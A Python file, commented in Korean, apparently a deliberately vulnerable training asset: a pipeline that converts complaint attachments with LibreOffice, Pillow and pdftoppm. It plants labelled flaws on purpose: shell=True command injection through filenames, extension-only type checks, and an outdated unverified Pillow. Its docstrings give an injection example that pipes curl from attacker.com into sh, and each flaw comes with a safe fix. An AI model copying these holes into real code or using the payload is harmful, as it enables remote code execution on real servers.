"""
파일 처리 파이프라인 — 민원 첨부파일 변환 엔진
Asset 06: Complaint Processing Server (192.168.92.206)

취약점 목록:
  VULN-06-04: 확장자 기반 파일 타입 감지 (Magic bytes 무시)
  VULN-06-05: LibreOffice 6.4.7 shell=True + 인자 미검증 (명령 삽입 가능)
  VULN-06-06: Pillow 8.4.0 (CVE-2022-22815/16/17) + verify() 미호출
  VULN-06-07: shell=True + 파일명 보간으로 명령 삽입 가능 (썸네일 생성)
"""

import logging
import os
import subprocess
import time
from pathlib import Path
from typing import Dict, List, Optional

import magic       # python-magic (libmagic 바인딩)
from PIL import Image

logger = logging.getLogger(__name__)

# ──────────────────────────────────────────────
# 지원 확장자 → 핸들러 매핑
# ──────────────────────────────────────────────
DOCUMENT_EXTENSIONS = {".doc", ".docx", ".hwp", ".hwpx", ".odt", ".rtf", ".txt", ".ppt", ".pptx", ".xls", ".xlsx"}
IMAGE_EXTENSIONS    = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".tif", ".webp"}
PDF_EXTENSIONS      = {".pdf"}

EXTENSION_TO_HANDLER: Dict[str, str] = {}
for ext in DOCUMENT_EXTENSIONS:
    EXTENSION_TO_HANDLER[ext] = "document"
for ext in IMAGE_EXTENSIONS:
    EXTENSION_TO_HANDLER[ext] = "image"
for ext in PDF_EXTENSIONS:
    EXTENSION_TO_HANDLER[ext] = "pdf"


class FileProcessor:
    """
    민원 첨부파일 변환 파이프라인.

    process() 메서드 하나로 파일 타입을 감지하고 적절한 변환기를 호출한다.
    변환 결과 파일 경로 리스트와 메타데이터를 dict로 반환한다.
    """

    # LibreOffice 실행 파일 경로 (VM 네이티브 설치 기준)
    LIBREOFFICE_BIN = os.environ.get("LIBREOFFICE_BIN", "libreoffice")

    def process(self, file_path: str | Path, work_dir: str | Path) -> dict:
        """
        파일을 처리하고 결과를 반환한다.

        Args:
            file_path: 처리할 원본 파일 경로
            work_dir:  변환 결과물을 저장할 임시 디렉토리

        Returns:
            {
                "file_type": str,               # 감지된 파일 타입
                "converted_files": List[str],   # 변환된 파일 경로 리스트
                "processing_time_sec": float,   # 처리 소요 시간
                "status": str,                  # "success" | "failed"
                "error": Optional[str],         # 오류 메시지 (실패 시)
            }
        """
        file_path = Path(file_path)
        work_dir  = Path(work_dir)
        work_dir.mkdir(parents=True, exist_ok=True)

        start_time = time.time()
        result = {
            "file_type": "unknown",
            "converted_files": [],
            "processing_time_sec": 0.0,
            "status": "failed",
            "error": None,
        }

        try:
            file_type = self._detect_file_type(file_path)
            result["file_type"] = file_type
            logger.info("파일 타입 감지: %s → %s", file_path.name, file_type)

            handler = EXTENSION_TO_HANDLER.get(file_path.suffix.lower(), "unknown")

            if handler == "document":
                pdf_path = self._convert_document_to_pdf(file_path, work_dir)
                if pdf_path:
                    result["converted_files"].append(str(pdf_path))
                    thumb = self._generate_pdf_thumbnail(pdf_path, work_dir)
                    if thumb:
                        result["converted_files"].append(str(thumb))

            elif handler == "image":
                thumbs = self._process_image(file_path, work_dir)
                result["converted_files"].extend([str(p) for p in thumbs])

            elif handler == "pdf":
                thumb = self._generate_pdf_thumbnail(file_path, work_dir)
                if thumb:
                    result["converted_files"].append(str(thumb))
                result["converted_files"].insert(0, str(file_path))  # 원본 PDF 포함

            else:
                # 알 수 없는 확장자: 원본 그대로 보존
                logger.warning("미지원 파일 타입: %s", file_path.suffix)
                result["converted_files"].append(str(file_path))

            result["status"] = "success"

        except Exception as e:
            # ──────────────────────────────────────────────────────────────
            # [취약점] VULN-06-08: 내부 경로 노출 (Information Disclosure)
            #   예외 메시지를 그대로 저장하면 절대 경로, 시스템 정보 등이
            #   DB를 통해 외부에 노출될 수 있음.
            #
            #   안전한 구현:
            #     result["error"] = "파일 처리 중 오류가 발생했습니다."
            #     logger.exception("내부 오류 (complaint=%s)", file_path.name)
            # ──────────────────────────────────────────────────────────────
            result["error"] = str(e)     # [취약 설정] 내부 경로/스택 트레이스 포함 가능
            result["status"] = "failed"
            logger.exception("파일 처리 실패: %s — %s", file_path, e)

        finally:
            result["processing_time_sec"] = round(time.time() - start_time, 3)

        return result

    # ──────────────────────────────────────────────────────────────────────
    # 파일 타입 감지
    # ──────────────────────────────────────────────────────────────────────
    def _detect_file_type(self, file_path: Path) -> str:
        """
        파일 타입을 감지한다.

        [취약점] VULN-06-04: 확장자 기반 파일 타입 감지 (Extension Spoofing)
          파일의 실제 내용(magic bytes)이 아닌 확장자만으로 타입을 결정한다.
          공격자가 악성 스크립트를 .docx로 이름을 바꾸면 문서로 처리되어
          LibreOffice 또는 다른 파서로 전달됨 → 파서 취약점 연계 공격 가능.

          python-magic으로 MIME 타입을 읽어오기는 하지만 최종 결정은
          확장자를 우선한다.

          안전한 구현:
            mime = magic.from_file(str(file_path), mime=True)
            # MIME 타입과 확장자가 일치하지 않으면 처리 거부
            if not _is_mime_ext_consistent(mime, file_path.suffix):
                raise ValueError(f"파일 타입 불일치: mime={mime} ext={file_path.suffix}")
        """
        # MIME 타입 조회 (참고용으로만 로깅)
        try:
            mime_type = magic.from_file(str(file_path), mime=True)
            logger.debug("magic MIME: %s → %s", file_path.name, mime_type)
        except Exception as e:
            logger.warning("magic 라이브러리 오류: %s — %s", file_path.name, e)
            mime_type = "application/octet-stream"

        # [취약 설정] 확장자를 최우선으로 사용 — magic MIME은 무시
        ext = file_path.suffix.lower()
        if ext in EXTENSION_TO_HANDLER:
            return ext.lstrip(".")

        # 확장자 미일치 시 magic 결과로 fallback
        return mime_type

    # ──────────────────────────────────────────────────────────────────────
    # 문서 → PDF 변환 (LibreOffice)
    # ──────────────────────────────────────────────────────────────────────
    def _convert_document_to_pdf(
        self, file_path: Path, work_dir: Path
    ) -> Optional[Path]:
        """
        LibreOffice를 사용하여 문서 파일을 PDF로 변환한다.

        [취약점] VULN-06-05: LibreOffice 명령 삽입 + 구버전 사용 (Command Injection + Outdated Software)

          (1) shell=True 사용: 파일명에 shell 메타문자( ; & | ` $ ( ) )가 포함되면
              임의 명령 실행 가능. 예) filename = "doc$(id).docx" → id 명령 실행됨.

          (2) --infilter 미지정: LibreOffice가 파일 내용을 직접 파싱하므로
              악성 문서(CVE-2023-1183 등) 처리 시 RCE 가능.

          (3) --headless 는 있지만 --norestore, --nodefault 등 안전 옵션 미사용.

          (4) LibreOffice 6.4.7 (훈련 환경 고정): 다수의 RCE 취약점 미패치 상태.
              최신 버전: 24.x 이상 권장.

          안전한 구현:
            # 파일명 메타문자 제거 후 리스트 형태로 전달 (shell=False)
            safe_name = re.sub(r'[^a-zA-Z0-9._\-]', '_', file_path.name)
            safe_path = file_path.parent / safe_name
            file_path.rename(safe_path)
            subprocess.run(
                [self.LIBREOFFICE_BIN, "--headless", "--norestore",
                 "--convert-to", "pdf",
                 "--infilter", "writer8",
                 "--outdir", str(work_dir),
                 str(safe_path)],
                shell=False,          # shell=False 필수
                timeout=120,
                check=True,
            )
        """
        logger.info("LibreOffice 변환 시작: %s", file_path.name)

        # [취약 설정] shell=True — 파일명의 shell 메타문자가 그대로 실행됨
        # [취약 설정] f-string으로 파일명을 직접 보간 — 명령 삽입 벡터
        cmd = (
            f"{self.LIBREOFFICE_BIN} --headless "
            f"--convert-to pdf "
            f"--outdir {work_dir} "
            f"{file_path}"          # [취약 설정] 파일명 검증 없음
        )
        try:
            proc = subprocess.run(
                cmd,
                shell=True,             # [취약 설정] shell=True
                capture_output=True,
                text=True,
                timeout=120,
            )
            if proc.returncode != 0:
                logger.error(
                    "LibreOffice 변환 실패 (returncode=%d): stderr=%s",
                    proc.returncode, proc.stderr,
                )
                return None

            # LibreOffice는 outdir에 원본 확장자를 .pdf로 교체한 파일을 생성한다
            pdf_name = file_path.stem + ".pdf"
            pdf_path = work_dir / pdf_name
            if not pdf_path.exists():
                logger.error("변환 결과 파일 없음: %s", pdf_path)
                return None

            logger.info("변환 완료: %s", pdf_path.name)
            return pdf_path

        except subprocess.TimeoutExpired:
            logger.error("LibreOffice 변환 타임아웃: %s", file_path.name)
            return None

    # ──────────────────────────────────────────────────────────────────────
    # 이미지 처리 (Pillow)
    # ──────────────────────────────────────────────────────────────────────
    def _process_image(self, file_path: Path, work_dir: Path) -> List[Path]:
        """
        이미지 파일을 처리한다: 썸네일 생성 + 표준 포맷(JPEG) 변환.

        [취약점] VULN-06-06: Pillow 8.4.0 + verify() 미호출 (CVE-2022-22815/16/17)

          (1) Pillow 8.4.0은 다수의 CVE 미패치:
              - CVE-2022-22815: PIL.ImagePath.Path 초기화 취약점
              - CVE-2022-22816: Buffer over-read (GIF)
              - CVE-2022-22817: eval() 호출로 임의 코드 실행 가능 (ImagingTransformMap)

          (2) img.verify() 미호출: 악성/손상 이미지의 내용 검증을 건너뜀.
              verify() 후에는 다시 open() 해야 한다 (Pillow API 제약).

          (3) 이미지 크기 제한 없음: 10000×10000 픽셀 이미지를 열면
              메모리 고갈(OOM) 발생 가능 — DoS 벡터.

          (4) EXIF 데이터 미제거: GPS 좌표 등 민감 메타데이터가 그대로 저장됨.

          안전한 구현:
            from PIL import Image, ImageFile
            ImageFile.LOAD_TRUNCATED_IMAGES = False
            Image.MAX_IMAGE_PIXELS = 50_000_000  # 50MP 제한
            img = Image.open(file_path)
            img.verify()            # 먼저 검증
            img = Image.open(file_path)  # verify() 후 재오픈 필수
            # EXIF 제거 후 저장
            data = list(img.getdata())
            clean = Image.new(img.mode, img.size)
            clean.putdata(data)
        """
        results: List[Path] = []
        logger.info("이미지 처리 시작: %s", file_path.name)

        try:
            # [취약 설정] verify() 없이 바로 open — 악성 이미지 검증 없음
            # [취약 설정] MAX_IMAGE_PIXELS 미설정 — 거대 이미지 DoS 가능
            img = Image.open(file_path)  # [취약 설정]
            img.load()

            # 원본 포맷 → JPEG 변환 저장
            converted_name = file_path.stem + "_converted.jpg"
            converted_path = work_dir / converted_name
            if img.mode in ("RGBA", "P"):
                img = img.convert("RGB")
            img.save(converted_path, "JPEG", quality=85)
            results.append(converted_path)

            # 썸네일 생성 (300×300)
            thumb = img.copy()
            thumb.thumbnail((300, 300), Image.LANCZOS)
            thumb_name = file_path.stem + "_thumb.jpg"
            thumb_path = work_dir / thumb_name
            thumb.save(thumb_path, "JPEG", quality=75)
            results.append(thumb_path)

            logger.info("이미지 처리 완료: %d개 파일 생성", len(results))

        except Exception as e:
            logger.error("이미지 처리 오류: %s — %s", file_path.name, e)
            raise

        return results

    # ──────────────────────────────────────────────────────────────────────
    # PDF 썸네일 생성 (pdftoppm)
    # ──────────────────────────────────────────────────────────────────────
    def _generate_pdf_thumbnail(
        self, pdf_path: Path, work_dir: Path
    ) -> Optional[Path]:
        """
        PDF 첫 페이지의 썸네일 이미지를 생성한다 (pdftoppm 사용).

        [취약점] VULN-06-07: shell=True + 파일명 보간으로 명령 삽입 가능 (Command Injection)

          pdf_path.name이 공격자 제어 하에 있고 shell=True이면
          파일명에 포함된 shell 메타문자가 그대로 실행된다.
          예) pdf_path = Path("/tmp/work/doc; curl attacker.com | sh #.pdf")
              → curl attacker.com | sh 실행됨

          안전한 구현:
            # 리스트 형태로 인자 분리 + shell=False
            subprocess.run(
                ["pdftoppm", "-jpeg", "-r", "72", "-f", "1", "-l", "1",
                 str(pdf_path), str(out_prefix)],
                shell=False,   # shell=False 필수
                timeout=30,
                check=True,
            )
        """
        out_prefix = work_dir / (pdf_path.stem + "_thumb")

        # [취약 설정] shell=True + f-string으로 파일 경로를 직접 보간
        cmd = f"pdftoppm -jpeg -r 72 -f 1 -l 1 {pdf_path} {out_prefix}"  # [취약 설정]
        try:
            proc = subprocess.run(
                cmd,
                shell=True,         # [취약 설정]
                capture_output=True,
                text=True,
                timeout=30,
            )
            if proc.returncode != 0:
                logger.warning(
                    "pdftoppm 실패 (returncode=%d): %s", proc.returncode, proc.stderr
                )
                return None

            # pdftoppm은 out_prefix-1.jpg 형태로 파일 생성
            thumb_path = work_dir / (pdf_path.stem + "_thumb-1.jpg")
            if not thumb_path.exists():
                # 단일 페이지 PDF는 -1 없이 생성되는 경우도 있음
                alt = work_dir / (pdf_path.stem + "_thumb.jpg")
                if alt.exists():
                    return alt
                logger.warning("썸네일 파일을 찾을 수 없음: %s", thumb_path)
                return None

            logger.info("PDF 썸네일 생성 완료: %s", thumb_path.name)
            return thumb_path

        except subprocess.TimeoutExpired:
            logger.error("pdftoppm 타임아웃: %s", pdf_path.name)
            return None
